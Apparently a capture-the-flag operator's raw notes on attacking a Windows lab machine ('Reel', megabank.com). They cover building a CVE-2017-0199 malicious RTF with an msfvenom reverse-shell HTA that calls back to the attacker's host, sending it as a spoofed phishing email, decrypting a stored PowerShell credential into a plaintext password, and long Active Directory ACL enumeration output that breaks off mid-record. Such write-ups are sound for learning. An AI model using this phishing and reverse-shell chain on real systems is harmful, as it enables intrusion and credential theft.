@@ -1,0 +1,1128 @@
+- Looked at the docs in the ftp folder and found nico@megabank.com with
+```bash
+exiftool Windows\ Event\ Forwarding.docx
+```
+- Nothing on smb
+- nothing with smtp
+- nothing with smtp-enum-users
+- no clear text creds on wireshark
+- Using the exploit at the following address without metasploit
+```
+https://nvd.nist.gov/vuln/detail/CVE-2017-0199
+```
+- This will get the user to open a malicious RTF file which makes an HTTP request for an HTA file and the HTA file executes the code to give a shell
+- msfvenom to generate the HTA file for a reverse shell
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=5555 -f hta-psh -o msfv.hta
+```
+- Create ab rtf file from the scripts in the github repo @ https://github.com/bhdresh/CVE-2017-0199 and the following options
+- -M gen to generate document
+- -w invoice.rtf as the output file name
+- -u http://10.10.14.22/msfv.hta the url to get the hta from 
+- -t rtf to create rtf document as opposed to ppsx
+- -x 0 to disable rtf obfuscation
+```bash
+python2 /opt/CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.22/msfv.hta -t rtf -x 0
+```
+- documents are prepped so will be serving the hta file from the apache2 server in /var/www/html nc listener to catch the shell then i'll send the phish
+- sending the phish with the following options on sendmail
+- -f the from address which can be anything as long as the domain exists
+- -t the to address FOUND IN THE DOCUMENT nico@megabank.com
+- -u The subject 
+- -m the body
+- -a the attachment
+- -s the smtp server
+- -v verbose
+- Here is the command
+```bash
+sendemail -f suckit@megabank.com -t nico@megabank.com -u "Get ya Invoices Hea" -m "You owe me money you clown" -a invoice.rtf -s 10.10.10.77 -v
+```
+- Starting the listener on 5555 with 
+```bash
+nc -nlvp 5555
+```
+- output
+```
+Jan 28 12:22:34 scrpt3 sendemail[92370]: DEBUG => Connecting to 10.10.10.77:25
+Jan 28 12:22:34 scrpt3 sendemail[92370]: DEBUG => My IP address is: 10.10.14.22
+Jan 28 12:22:34 scrpt3 sendemail[92370]: SUCCESS => Received:   220 Mail Service ready
+Jan 28 12:22:34 scrpt3 sendemail[92370]: INFO => Sending:       EHLO scrpt3.kali.local
+Jan 28 12:22:34 scrpt3 sendemail[92370]: SUCCESS => Received:   250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
+Jan 28 12:22:34 scrpt3 sendemail[92370]: INFO => Sending:       MAIL FROM:<suckit@megabank.com>
+Jan 28 12:22:34 scrpt3 sendemail[92370]: SUCCESS => Received:   250 OK
+Jan 28 12:22:34 scrpt3 sendemail[92370]: INFO => Sending:       RCPT TO:<nico@megabank.com>
+Jan 28 12:22:34 scrpt3 sendemail[92370]: SUCCESS => Received:   250 OK
+Jan 28 12:22:34 scrpt3 sendemail[92370]: INFO => Sending:       DATA
+Jan 28 12:22:34 scrpt3 sendemail[92370]: SUCCESS => Received:   354 OK, send.
+Jan 28 12:22:34 scrpt3 sendemail[92370]: INFO => Sending message body
+Jan 28 12:22:34 scrpt3 sendemail[92370]: Setting content-type: text/plain
+Jan 28 12:22:34 scrpt3 sendemail[92370]: DEBUG => Sending the attachment [invoice.rtf]
+Jan 28 12:22:46 scrpt3 sendemail[92370]: SUCCESS => Received:   250 Queued (11.656 seconds)
+Jan 28 12:22:46 scrpt3 sendemail[92370]: Email was sent successfully!  From: <suckit@megabank.com> To: <nico@megabank.com> Subject: [Get ya Invoices Hea] Attachment(s): [invoice.rtf] Server: [10.10.10.77:25]
+```
+- Got a shell as nico 
+- The /domain doesnt work with net user or whoami right now. Trying to get user.txt
+- got user on nico's desktop
+- Output of cred.xml on nico's desktop
+```
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+- Open-attachments.bat on nico's website
+```
+@echo off
+
+:LOOP
+
+echo Looking for attachments
+
+cd C:\Users\nico\Documents\
+
+
+DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i doc > C:\Users\nico\Documents\files.txt
+DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i rtf >> C:\Users\nico\Documents\files.txt
+
+FOR /F "tokens=*" %%i in (files.txt) DO echo Opening attachments && MOVE /y C:\Users\nico\Documents\Attachments\%%i C:\Users\nico\Documents\Processed\%%i
+
+FOR /F "tokens=*" %%i in (files.txt) DO START C:\Users\nico\Documents\auto-enter.ahk && ping 127.0.0.1 -n 3 > nul && START C:\Users\nico\Documents\Processed\%%i && ping 127.0.0.1 -n 20 > nul && taskkill /F /IM wordpad.exe && taskkill /F /IM AutoHotkey.exe && ping 127.0.0.1 -n 3 > nul
+
+DEL /F C:\Users\nico\Documents\files.txt && ping 127.0.0.1 -n 3 > nul
+DEL /F C:\Users\nico\Documents\Processed\*.rtf
+DEL /F C:\Users\nico\Documents\Processed\*.doc
+DEL /F C:\Users\nico\Documents\Processed\*.docx
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+```
+- auto-enter.ahk on nico's desktop
+```
+#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
+; #Warn  ; Enable warnings to assist with detecting common errors.
+SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
+SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
+
+    #Persistent
+    SetTimer, PressTheKey, 6000
+    Return
+
+    PressTheKey:
+    Send {Alt Down}{Tab}{Alt Up}
+    sleep 1000
+    Send {Space}
+    Return
+```
+- creating a userlist based on the names in the C:\Users directory
+```
+Administrator
+brad
+claire
+herman
+julia
+nico
+Public
+SSHD
+tom
+```
+- None of their folders I have access to right now. 
+- ok so the cred.xml file is a powershell object called PSCredential
+	- Provides a method to store usernames, passwords and credentials.
+	- There are two functions used to save the credentials and restore them from a file
+		- Import-CliXml and Export-CliXml
+		- The creds.xml file is the output of Export-CliXml
+		- So we can get a plaintexxt password from the file by loading it with Import-CliXml then dumping the results on kali
+```PowerShell
+$cred = Import-CliXml -Path cred.xml
+```
+```PowerShell
+$cred.GetNetworkCredential() | Format-List *
+```
+- Output no password
+```
+UserName       : Tom
+Password       : 
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+- Trying the following command on the remote machine 
+```PowerShell
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+```
+- Output (worked this time)
+```PowerShell
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+- Can ssh as tom with 1ts-mag1c!!!
+```bash
+ssh tom@10.10.10.77
+```
+- Output of note.txt under the  Desktop\AD Audit Directory
+```
+Findings:                                                                                                                       
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
+
+Maybe we should re-run Cypher query against other groups we've created.
+```
+- Found more users
+```PowerShell
+net users /domain
+```
+- Getting winpeas
+```PowerShell 
+wget http://10.10.14.22/windows/winpeas/winPEASany.exe -Outfile C:\Users\tom\Documents\winpeas.exe
+```
+```PowerShell
+.\winpeas.exe
+```
+- Blocked by group policy
+- Trying PowerView Enumeration because it's already in the AD Audit directory 
+```PowerShell
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+```
+```PowerShell
+. .\PowerView.ps1
+```
+- domain is 
+```
+reel.htb.local
+```
+```PowerShell
+Get-NetUser | select cn
+```
+- Output
+```
+cn                                                                                                                              
+--                                                              
+Administrator                                                    Guest                                                            krbtgt                                                           Nico Romano                                                      Tom Hanson                                                       SystemMailbox{1f05a927-cba0-4a5a-af27-e49d41b0e99d}              SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}              DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}    FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042              Claire Danes                                                     Herman Yung                                                      Brad Hindman                                                     Julia Kolkowitz                                                  Ranj Singh                                                       Brad_DA                                                          Claire_DA                                                        Mark Aimes                                                       Rosie Watts
+```
+- Looking for vulnerable Os
+```PowerShell
+Get-NetComputer | select operatingsystem,operatingsystemversion
+```
+- Output
+```
+operatingsystem                         operatingsystemversion                                          
+---------------                         ----------------------
+Windows Server 2012 R2 Standard                                 6.3 (9600) 
+```
+- Does current user have any admin access on the domain?
+```PowerShell
+Find-LocalAdminAccess
+```
+- no luck
+- Get computername for powerview
+```PowerShell
+(Get-WmiObject -Class Win32_ComputerSystem).Name
+```
+- Access Denied
+- Trying 
+```PowerShell
+$env:COMPUTERNAME
+```
+```
+REEL
+```
+- Getting sessions with 
+```PowerShell
+Get-NetSession -ComputerName REEL -Verbose
+```
+- Output 
+```
+VERBOSE: [Get-NetSession] Error: The operation completed successfully 
+```
+- Troubleshooting with
+```PowerShell
+Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity | fl
+```
+- Looks like were good in the output below
+```Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity  
+Owner  : NT AUTHORITY\SYSTEM                                                                                                    
+Group  : NT AUTHORITY\SYSTEM                                                                                                    
+Access : NT AUTHORITY\Authenticated Users Allow  ReadKey                                                                        
+         NT AUTHORITY\Authenticated Users Allow  -2147483648                                                                    
+         BUILTIN\Server Operators Allow  SetValue, CreateSubKey, Delete, ReadKey                                                
+         BUILTIN\Server Operators Allow  -1073676288                                                                            
+         BUILTIN\Administrators Allow  FullControl                                                                              
+         BUILTIN\Administrators Allow  268435456                                                                                
+         NT AUTHORITY\SYSTEM Allow  FullControl                                                                                 
+         NT AUTHORITY\SYSTEM Allow  268435456                                                                                   
+         CREATOR OWNER Allow  268435456                                                                                         
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey                                                  
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648                                              
+Audit  :                                                                                                                        
+Sddl   : O:SYG:SYD:AI(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;CCDCLCSWRPSDRC;;;SO)(A;CIIOID;SDGWGR;;;SO)(A;ID;KA;;;BA)(A;CIIOID;GA 
+         ;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)
+```
+- going to use logonsessions.exe from sysinternals to verify
+```PowerShell
+wget http://10.10.14.22/windows/sysinternals/logonsessions.exe -Outfile C:\Users\tom\Documents\logonsessions.exe
+```
+- Fucking blocked by group policy
+- checking tom's group memberships
+```PowerShell
+Get-NetUser tom
+```
+```
+MegaBank_Users
+All_Staff
+HelpDesk_Admins
+```
+- Checking his ACL permissions now with powerview
+```PowerShell
+Get-ObjectAcl -Identity tom
+```
+- Output
+```                               
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-24127574-1107                                                         
+ActiveDirectoryRights  : ExtendedRight                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 256                                     SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                            AceType                : AccessAllowedObject                     AceFlags               : None                                   IsInherited            : False                                   InheritanceFlags       : None                                    PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : ReadProperty, WriteProperty             ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : bf967a7f-0de6-11d0-a285-00aa003049e2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 48                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-517                                                   AceType                : AccessAllowedObject                     AceFlags               : None                                    IsInherited            : False                                   InheritanceFlags       : None                                    PropagationFlags       : None                                    AuditFlags             : None                                    
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : bf967a06-0de6-11d0-a285-00aa003049e2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                  AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                        IsInherited            : False                                   InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                    
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : bf967a06-0de6-11d0-a285-00aa003049e2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                  AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                        IsInherited            : False                                   InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : 3e74f60e-3e73-11d1-a9c0-0000f80367c1    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                           
+AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                       IsInherited            : False                                   InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : 3e74f60e-3e73-11d1-a9c0-0000f80367c1    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                     AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                  AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                        IsInherited            : False                                  InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : b1b3a417-ec55-4191-b327-b72e33e38af2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                 AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                        IsInherited            : False                                   InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL  ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights  : WriteProperty                           ObjectAceFlags         : ObjectAceTypePresent                    ObjectAceType          : b1b3a417-ec55-4191-b327-b72e33e38af2    InheritedObjectAceType : 00000000-0000-0000-0000-000000000000    BinaryLength           : 56                                      AceQualifier           : AccessAllowed                           IsCallback             : False                                   OpaqueLength           : 0                                       AccessMask             : 32                                      SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                  AceType                : AccessAllowedObject                     AceFlags               : ContainerInherit                        IsInherited            : False                                   InheritanceFlags       : ContainerInherit                        PropagationFlags       : None                                    AuditFlags             : None                                                                                                   
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf96791a-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf96791a-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 9a9a021e-4a5b-11d1-a9c3-0000f80367c1                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 934de926-b09e-11d2-aa06-00c04f8eedd8                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 5e353847-f36c-48be-a7f7-49685402503c                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967953-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967953-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : e48d0154-bcf8-11d1-8702-00c04fb96050                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 275b2f54-982d-4dcd-b0ad-e53501445efb                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967954-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967954-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967961-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967961-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
